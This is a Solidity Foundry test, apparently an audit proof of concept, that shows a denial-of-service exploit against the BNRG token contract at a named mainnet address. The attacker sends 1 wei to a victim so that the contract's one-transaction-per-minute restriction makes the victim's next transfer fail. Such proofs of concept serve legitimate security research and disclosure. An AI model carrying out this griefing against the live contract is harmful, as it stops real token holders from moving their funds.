```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IBNRG {
    function transfer(address recipient, uint256 amount) external returns (bool);
    function state() external view returns (uint8);
}

contract ExploitTest is Test {
    address constant TARGET = 0xd8813B5Dfa9AbEB693F217Bb905ec99B66FB017C;
    IBNRG constant target = IBNRG(TARGET);

    function setUp() public {
        // Label addresses for readability
        vm.label(TARGET, "BNRG");
        vm.label(address(this), "ExploitTest");
    }

    function testDenialOfService() public {
        // Ensure the contract is in Restricted state (1)
        uint8 currentState = target.state();
        if (currentState != 1) {
            // state is stored at slot 10 (after Ownable._owner slot0, _totalSupply slot1,
            // mapping balances slot2, allowed slot3, boosterBuyingAllowed slot4,
            // stakingContractAddress slot5, restrictionLiftTime slot6,
            // maxRestrictionAmount slot7, isBlacklisted slot8, lastTx slot9, state slot10)
            vm.store(TARGET, bytes32(uint256(10)), bytes32(uint256(1)));
        }

        address attacker = address(0xDEAD);
        address victim = address(0xBEEF);
        address thirdParty = address(0xCAFE);

        // Give attacker 1000 tokens by directly writing to the balance mapping.
        // balances mapping is at slot 2, so storage location = keccak256(abi.encode(attacker, 2))
        bytes32 balanceSlot = keccak256(abi.encode(attacker, uint256(2)));
        vm.store(TARGET, balanceSlot, bytes32(uint256(1000 ether)));

        // Attacker sends 1 wei to victim – this sets lastTx[victim] to block.timestamp.
        vm.prank(attacker);
        target.transfer(victim, 1);

        // Victim now tries to send tokens to thirdParty.
        // The launchRestrict modifier will revert because lastTx[victim] was set within the last 60 seconds.
        vm.prank(victim);
        vm.expectRevert("BMON: only one tx/min in restricted mode");
        target.transfer(thirdParty, 1);

        // Attacker has successfully blocked victim's transaction within the same block.
        // (The victim would have to wait >60 seconds before making another transfer.)
    }
}
```
